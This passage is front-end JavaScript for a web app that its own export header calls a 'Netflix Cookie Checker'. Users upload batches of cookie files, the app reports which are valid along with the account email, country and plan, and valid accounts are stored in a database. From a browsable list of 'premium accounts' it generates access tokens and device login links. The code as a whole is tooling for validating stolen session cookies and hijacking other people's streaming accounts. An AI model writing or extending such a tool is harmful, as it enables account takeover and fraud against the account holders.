      extraInfo = ` | Token: ${data.token.substring(0, 12)}...`;
    } else if (batchMode === "generate_token" && data.token_error) {
      extraInfo = " | Token failed";
    }

    const storedBadge = data.stored_in_db
      ? '<span class="stored-badge-small"><i class="fas fa-database"></i></span>'
      : "";

    item.innerHTML = `
            <div class="file-icon" style="background: rgba(6,255,165,0.1); color: var(--accent-green);">
                <i class="fas fa-check"></i>
            </div>
            <div class="file-info">
                <div class="file-name">${escapeHtml(result.filename)} ${storedBadge}</div>
                <div class="file-size">${sanitizeDisplay(data.email) || "N/A"} | ${data.country || "N/A"} | ${data.subscription_type || "Unknown"}${extraInfo}</div>
            </div>
            <span class="file-status valid">Valid</span>
        `;
  } else {
    item.innerHTML = `
            <div class="file-icon" style="background: rgba(230,57,70,0.1); color: var(--accent-red);">
                <i class="fas fa-times"></i>
            </div>
            <div class="file-info">
                <div class="file-name">${escapeHtml(result.filename)}</div>
                <div class="file-size" style="color: var(--accent-red);">${result.message || "Unknown error"}</div>
            </div>
            <span class="file-status invalid">Invalid</span>
        `;
  }

  batchResults.appendChild(item);
  // Auto-scroll to bottom
  batchResults.scrollTop = batchResults.scrollHeight;
}

function updateStats(total, valid, invalid) {
  document.getElementById("total-files").textContent = total;
  document.getElementById("valid-files").textContent = valid;
  document.getElementById("invalid-files").textContent = invalid;

  const rate = total > 0 ? ((valid / total) * 100).toFixed(0) : 0;
  document.getElementById("success-rate").textContent = `${rate}%`;
}

function escapeHtml(text) {
  if (!text) return "";
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

// Add CSS animation for slide-in effect
const style = document.createElement("style");
style.textContent = `
    @keyframes slideIn {
        from {
            opacity: 0;
            transform: translateX(-20px);
        }
        to {
            opacity: 1;
            transform: translateX(0);
        }
    }
`;
document.head.appendChild(style);

async function processBatchStreaming(formData, progress, status, btn, saveBtn) {
  const response = await fetch(`${API_URL}/api/batch-check`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      Accept: "text/event-stream",
    },
    body: formData,
  });

  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }

  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";

  let validCount = 0;
  let invalidCount = 0;
  let totalCount = selectedFiles.length;

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split("\n");
    buffer = lines.pop(); // Keep incomplete line in buffer

    for (const line of lines) {
      if (line.startsWith("data: ")) {
        try {
          const data = JSON.parse(line.slice(6));

          if (data.type === "progress") {
            // Update progress bar
            progress.style.width = `${data.percent}%`;
            status.textContent = `Processing ${data.current}/${data.total}: ${data.filename}`;

            // Update file item status
            updateFileItemStatus(data.filename, "processing");
          } else if (data.type === "result") {
            // Normalize the result structure to always have .data
            const result = data.result;
            if (result.status === "success" && !result.data) {
              // Wrap the result data if not already wrapped
              result.data = {
                email: result.email,
                country: result.country,
                plan: result.plan,
                subscription_type: result.subscription_type,
                is_premium: result.is_premium,
                stored_in_db: result.stored_in_db,
                token: result.token,
                expires: result.expires,
                login_urls: result.login_urls,
                token_error: result.token_error,
              };
            }
            batchResultsData.push(result);

            if (result.status === "success") {
              validCount++;
              updateFileItemStatus(result.filename, "valid");
              addResultToDisplay(result, true);
            } else {
              invalidCount++;
              updateFileItemStatus(result.filename, "invalid");
              addResultToDisplay(result, false);
            }

            // Update statistics in real-time
            updateStats(totalCount, validCount, invalidCount);
          } else if (data.type === "complete") {
            // Final completion
            progress.style.width = "100%";
            status.textContent = `Complete - ${data.summary.valid} valid, ${data.summary.invalid} invalid`;
            saveBtn.disabled = false;
            btn.disabled = false;
            btn.innerHTML = `<i class="fas fa-play"></i><span>${modeDescriptions[batchMode].batchBtnText}</span>`;

            showNotification(
              `Processed: ${data.summary.valid} valid, ${data.summary.invalid} invalid`,
            );
          }
        } catch (e) {
          console.error("Error parsing SSE data:", e);
        }
      }
    }
  }
}

function displayBatchResults(results) {
  const batchResults = document.getElementById("batch-results");
  batchResults.innerHTML = "";
  let validCount = 0;
  let invalidCount = 0;

  //console.log("Displaying batch results:", results);

  if (!results || results.length === 0) {
    batchResults.innerHTML = `
            <div class="result-placeholder">
                <i class="fas fa-stream"></i>
                <span>No results to display</span>
            </div>
        `;
    updateStats(0, 0, 0);
    return;
  }

  results.forEach((result) => {
    const item = document.createElement("div");
    item.className = "file-item";

    if (result.status === "success") {
      validCount++;
      const data = result.data || result;
      let extraInfo = "";

      if (batchMode === "generate_token" && data.token) {
        extraInfo = ` | Token: ${data.token.substring(0, 12)}...`;
      }

      const storedBadge = data.stored_in_db
        ? '<span class="stored-badge-small"><i class="fas fa-database"></i></span>'
        : "";

      item.innerHTML = `
                <div class="file-icon" style="background: rgba(6,255,165,0.1); color: var(--accent-green);">
                    <i class="fas fa-check"></i>
                </div>
                <div class="file-info">
                    <div class="file-name">${escapeHtml(result.filename)} ${storedBadge}</div>
                    <div class="file-size">${sanitizeDisplay(data.email) || "N/A"} | ${data.country || "N/A"} | ${data.subscription_type || "Unknown"}${extraInfo}</div>
                </div>
                <span class="file-status valid">Valid</span>
            `;
    } else {
      invalidCount++;
      item.innerHTML = `
                <div class="file-icon" style="background: rgba(230,57,70,0.1); color: var(--accent-red);">
                    <i class="fas fa-times"></i>
                </div>
                <div class="file-info">
                    <div class="file-name">${escapeHtml(result.filename)}</div>
                    <div class="file-size" style="color: var(--accent-red);">${result.message || "Unknown error"}</div>
                </div>
                <span class="file-status invalid">Invalid</span>
            `;
    }
    batchResults.appendChild(item);
  });

  updateStats(results.length, validCount, invalidCount);
}

// Helper function to update statistics display
function updateStats(total, valid, invalid) {
  document.getElementById("total-files").textContent = total;
  document.getElementById("valid-files").textContent = valid;
  document.getElementById("invalid-files").textContent = invalid;

  const rate = total > 0 ? ((valid / total) * 100).toFixed(0) : 0;
  document.getElementById("success-rate").textContent = `${rate}%`;
}

// Helper function to escape HTML
function escapeHtml(text) {
  if (!text) return "";
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

function handleSaveResults() {
  if (batchResultsData.length === 0) return;

  let content = "NETFLIX COOKIE CHECKER - BATCH RESULTS\n";
  content += "=".repeat(80) + "\n";
  content += `Generated: ${new Date().toLocaleString()}\n`;
  content += `Mode: ${batchMode === "check_only" ? "Check Only" : "Generate Token"}\n\n`;

  let validCount = 0;

  batchResultsData.forEach((result) => {
    const data = result.data || result;

    if (result.status === "success") {
      validCount++;
      // FIX: Decode email before saving
      const decodedEmail = decodeEmail(data.email);

      content += `✅ ${result.filename}\n`;
      content += `   Email: ${decodedEmail}\n`; // Use decoded email
      content += `   Country: ${data.country || "N/A"}\n`;
      content += `   Plan: ${data.plan || "N/A"}\n`;
      content += `   Type: ${data.subscription_type || "N/A"}\n`;
      content += `   Premium: ${data.is_premium ? "Yes" : "No"}\n`;
      content += `   Stored: ${data.stored_in_db ? "Yes" : "No"}\n`;

      if (batchMode === "generate_token") {
        if (data.token) {
          content += `   Token: ${data.token}\n`;
          content += `   Mobile: ${data.login_urls?.phone || "N/A"}\n`;
          content += `   TV: ${data.login_urls?.tv || "N/A"}\n`;
          content += `   PC: ${data.login_urls?.pc || "N/A"}\n`;
          content += `   Expires: ${data.expires ? new Date(data.expires * 1000).toLocaleString() : "N/A"}\n`;
        } else if (data.token_error) {
          content += `   Token Error: ${data.token_error}\n`;
        }
      }

      content += "-".repeat(80) + "\n";
    } else {
      content += `❌ ${result.filename}\n`;
      content += `   Error: ${result.message || "Unknown error"}\n`;
      content += "-".repeat(80) + "\n";
    }
  });

  content += `\nSUMMARY\n`;
  content += `Total: ${batchResultsData.length}\n`;
  content += `Valid: ${validCount}\n`;
  content += `Invalid: ${batchResultsData.length - validCount}\n`;
  content += `Success Rate: ${((validCount / batchResultsData.length) * 100).toFixed(1)}%\n`;

  const blob = new Blob([content], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `netflix_results_${new Date().toISOString().slice(0, 10)}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);

  showNotification("Results exported successfully");
}

// Premium Accounts Functions
async function loadAccounts() {
  const accountsList = document.getElementById("accounts-list");
  accountsList.innerHTML = `
        <div class="loading-state">
            <i class="fas fa-circle-notch fa-spin"></i>
            <span>Loading accounts...</span>
        </div>
    `;

  try {
    const data = await apiCall("/api/accounts");

    //console.log("API Response:", data); // DEBUG

    if (!data) {
      accountsList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-exclamation-circle"></i>
                    <span>Failed to load accounts</span>
                </div>
            `;
      return;
    }

    if (data.status === "success") {
      displayAccounts(data.accounts);
    } else {
      accountsList.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-exclamation-circle"></i>
                    <span>${data.message || "Error loading accounts"}</span>
                </div>
            `;
    }
  } catch (error) {
    console.error("Load accounts error:", error);
    accountsList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-exclamation-circle"></i>
                <span>Failed to load accounts</span>
            </div>
        `;
  }
}

function displayAccounts(accounts) {
  const accountsList = document.getElementById("accounts-list");

  //console.log("Displaying accounts:", accounts);

  if (!accounts || accounts.length === 0) {
    accountsList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-inbox"></i>
                <span>No accounts available</span>
            </div>
        `;
    return;
  }

  // Store all accounts globally
  allAccounts = accounts.map((acc) => ({
    ...acc,
    email: decodeEmail(acc.email), // Decode email immediately
  }));
  filteredAccounts = [...allAccounts];

  renderAccountsUI();
}

function decodeEmail(email) {
  if (!email) return "N/A";
  // Decode \x40 to @ and handle other potential encodings
  const decoded = email
    .replace(/\\x40/g, "@")
    .replace(/%40/g, "@")
    .replace(/&#64;/g, "@");

  // Return sanitized version for display
  return sanitizeDisplay(decoded);
}

function renderAccountsUI() {
  const accountsList = document.getElementById("accounts-list");

  // Get unique countries and subscription types for filters
  const countries = [
    ...new Set(allAccounts.map((a) => a.country).filter(Boolean)),
  ].sort();
  const subTypes = [
    ...new Set(allAccounts.map((a) => a.subscription_type).filter(Boolean)),
  ].sort();

  // Build filter UI
  let html = `
        <div class="accounts-filters">
            <div class="filter-group">
                <label><i class="fas fa-search"></i> Search Email</label>
                <input type="text" id="email-search" placeholder="Search by email..." 
                       value="${document.getElementById("email-search")?.value || ""}">
            </div>
            <div class="filter-group">
                <label><i class="fas fa-globe"></i> Country</label>
                <select id="country-filter">
                    <option value="">All Countries</option>
                    ${countries.map((c) => `<option value="${c}" ${document.getElementById("country-filter")?.value === c ? "selected" : ""}>${c}</option>`).join("")}
                </select>
            </div>
            <div class="filter-group">
                <label><i class="fas fa-crown"></i> Subscription</label>
                <select id="subtype-filter">
                    <option value="">All Types</option>
                    ${subTypes.map((t) => `<option value="${t}" ${document.getElementById("subtype-filter")?.value === t ? "selected" : ""}>${t}</option>`).join("")}
                </select>
            </div>
            <div class="filter-stats">
                Showing ${filteredAccounts.length} of ${allAccounts.length} accounts
            </div>
        </div>
        <div class="accounts-list-items">
    `;

  if (filteredAccounts.length === 0) {
    html += `
            <div class="empty-state">
                <i class="fas fa-search"></i>
                <span>No accounts match your filters</span>
            </div>
        `;
  } else {
    filteredAccounts.forEach((acc) => {
      html += `
                <div class="account-item" onclick="generateTokenForAccount('${acc.id}')">
                    <div class="account-icon">
                        <i class="fas fa-user-circle"></i>
                    </div>
                    <div class="account-details">
                        <div class="account-email">${escapeHtml(acc.email)}</div>
                        <div class="account-meta">
                            <span class="account-type">${acc.subscription_type || "Unknown"}</span>
                            <span class="account-country"><i class="fas fa-globe"></i> ${acc.country || "N/A"}</span>
                            <span class="account-plan">${acc.plan || "Unknown"}</span>
                        </div>
                    </div>
                    <div class="account-action">
                        <i class="fas fa-key"></i>
                        <span>Generate</span>
                    </div>
                </div>
            `;
    });
  }

  html += `</div>`;
  accountsList.innerHTML = html;

  // Attach event listeners
  attachFilterListeners();
}

function attachFilterListeners() {
  const searchInput = document.getElementById("email-search");
  const countrySelect = document.getElementById("country-filter");
  const subtypeSelect = document.getElementById("subtype-filter");

  const applyFilters = () => {
    const searchTerm = searchInput.value.toLowerCase();
    const country = countrySelect.value;
    const subType = subtypeSelect.value;

    filteredAccounts = allAccounts.filter((acc) => {
      const matchEmail = acc.email.toLowerCase().includes(searchTerm);
      const matchCountry = !country || acc.country === country;
      const matchType = !subType || acc.subscription_type === subType;
      return matchEmail && matchCountry && matchType;
    });

    renderAccountsUI(); // Re-render with filters applied
  };

  searchInput?.addEventListener("input", debounce(applyFilters, 300));
  countrySelect?.addEventListener("change", applyFilters);
  subtypeSelect?.addEventListener("change", applyFilters);
}

// Debounce helper for search input
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

// Helper function to escape HTML to prevent XSS
function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

async function generateTokenForAccount(accountId) {
  showTokenModalLoading();

  try {
    const data = await apiCall(`/api/accounts/${accountId}/generate-token`, {
      method: "POST",
    });

    if (!data) return;

    if (data.status === "success") {
      displayTokenModal(data.data);
    } else {
      hideTokenModal();
      showNotification(data.message, true);
    }
  } catch (error) {
    hideTokenModal();
    showNotification("Failed to generate token", true);
  }
}

function showTokenModalLoading() {
  const modalBody = document.getElementById("token-modal-body");
  modalBody.innerHTML = `
        <div class="token-loading">
            <i class="fas fa-circle-notch fa-spin"></i>
            <span>Generating access token...</span>
        </div>
    `;
  tokenModal.classList.add("show");
}

function displayTokenModal(data) {
  const expTime = data.expires
    ? new Date(data.expires * 1000).toLocaleString()
    : "Unknown";

  const modalBody = document.getElementById("token-modal-body");
  modalBody.innerHTML = `
        <div class="token-result">
            <div class="token-account-info">
                <h4>${sanitizeDisplay(data.email)}</h4>
                <span class="token-type">${data.subscription_type}</span>
            </div>
            
            <div class="device-grid">
                <div class="device-card phone">
                    <div class="device-header">
                        <div class="device-icon"><i class="fas fa-mobile-alt"></i></div>
                        <div class="device-name">Mobile</div>
                    </div>
                    <a href="${data.login_urls.phone}" target="_blank" class="device-link">
                        <i class="fas fa-external-link-alt"></i> Open
                    </a>
                    <button class="btn-copy" onclick="copyToClipboard('${data.login_urls.phone}', 'Link copied!')">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                
                <div class="device-card tv">
                    <div class="device-header">
                        <div class="device-icon"><i class="fas fa-tv"></i></div>
                        <div class="device-name">Smart TV</div>
                    </div>
                    <a href="${data.login_urls.tv}" target="_blank" class="device-link">
                        <i class="fas fa-external-link-alt"></i> Open
                    </a>
                    <button class="btn-copy" onclick="copyToClipboard('${data.login_urls.tv}', 'Link copied!')">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                
                <div class="device-card pc">
                    <div class="device-header">
                        <div class="device-icon"><i class="fas fa-laptop"></i></div>
                        <div class="device-name">PC</div>
                    </div>
                    <a href="${data.login_urls.pc}" target="_blank" class="device-link">
                        <i class="fas fa-external-link-alt"></i> Open
                    </a>
                    <button class="btn-copy" onclick="copyToClipboard('${data.login_urls.pc}', 'Link copied!')">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
            </div>
            
            <div class="token-details">
                <div class="token-header">
                    <span><i class="fas fa-key"></i> Access Token</span>
                    <span class="token-expires"><i class="fas fa-clock"></i> Expires: ${expTime}</span>
                </div>
                <div class="token-value-box">
                    <code>${data.token}</code>
                    <button class="btn-copy" onclick="copyToClipboard('${data.token}', 'Token copied!')">
                        <i class="fas fa-copy"></i>
                    </button>
                </div>
            </div>
        </div>
    `;
}

function hideTokenModal() {
  tokenModal.classList.remove("show");
}

// Utilities
function copyToClipboard(text, successMsg) {
  navigator.clipboard
    .writeText(text)
    .then(() => showNotification(successMsg))
    .catch(() => showNotification("Failed to copy", true));
}

function showNotification(message, isError = false) {
  const notification = document.getElementById("notification");
  notification.innerHTML = `<i class="fas fa-${isError ? "times-circle" : "check-circle"}"></i><span>${message}</span>`;
  notification.className = "notification" + (isError ? " error" : "");
  notification.classList.add("show");

  setTimeout(() => notification.classList.remove("show"), 3000);
}

function showUpgradeModal() {
  showNotification("Please contact admin to upgrade to Premium", true);
}

// Close modals on outside click
window.onclick = function (event) {
  if (event.target === authModal) {
    hideAuthModal();
  }
  if (event.target === tokenModal) {
    hideTokenModal();
  }
};

// Make functions available globally
window.copyToClipboard = copyToClipboard;
window.showAuthModal = showAuthModal;
window.hideAuthModal = hideAuthModal;
window.toggleAuthMode = toggleAuthMode;
window.logout = logout;
window.showUpgradeModal = showUpgradeModal;
window.hideTokenModal = hideTokenModal;
